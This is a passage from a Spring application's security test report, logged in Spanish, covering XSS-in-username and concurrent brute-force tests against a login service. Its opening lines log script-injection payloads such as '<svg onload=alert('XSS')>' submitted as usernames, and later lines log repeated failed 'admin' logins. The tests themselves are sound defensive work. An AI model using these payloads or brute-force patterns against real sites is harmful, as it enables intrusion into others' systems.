17:10:36.463 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: javascript:alert('XSS')
17:10:36.463 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario javascript:alert('XSS'): Credenciales inválidas
17:10:36.474 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: <svg onload=alert('XSS')>
17:10:36.476 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.479 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: <svg onload=alert('XSS')>
17:10:36.479 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario <svg onload=alert('XSS')>: Credenciales inválidas
17:10:36.491 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: '"><script>alert('XSS')</script>
17:10:36.493 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.495 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Usuario no encontrado o inactivo: '"><script>alert('XSS')</script>
17:10:36.496 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario '"><script>alert('XSS')</script>: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldHandleConcurrentBruteForceAttacks" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="1.267">
    <system-out><![CDATA[17:10:36.529 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.532 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.535 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.538 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.538 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.540 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.541 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.543 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.544 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.546 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.557 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.558 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.602 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.604 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.656 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.659 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.708 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.710 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.760 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.762 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.850 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.851 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.866 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.866 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.867 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.868 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.869 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.869 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.870 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.870 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.872 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.873 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.879 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.879 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.880 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.881 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.882 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.882 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.883 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.883 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.887 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.889 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.899 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.901 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.949 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:36.950 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:36.969 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.971 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.022 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.025 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.054 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.055 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.064 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.066 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.076 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.078 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.141 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.145 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.167 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.168 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.197 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.198 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.210 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.210 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.229 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.229 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.258 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.258 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.260 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.261 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.262 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.263 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.331 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.332 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.402 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.403 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.405 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.405 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.473 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:37.473 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:37.481 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:37.483 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:37.766 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:37.769 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:37.769 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:37 MST 2025, expiration: Wed Jul 02 18:10:37 MST 2025
17:10:37.771 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:37.772 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:37.772 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
]]></system-out>
  </testcase>
</testsuite>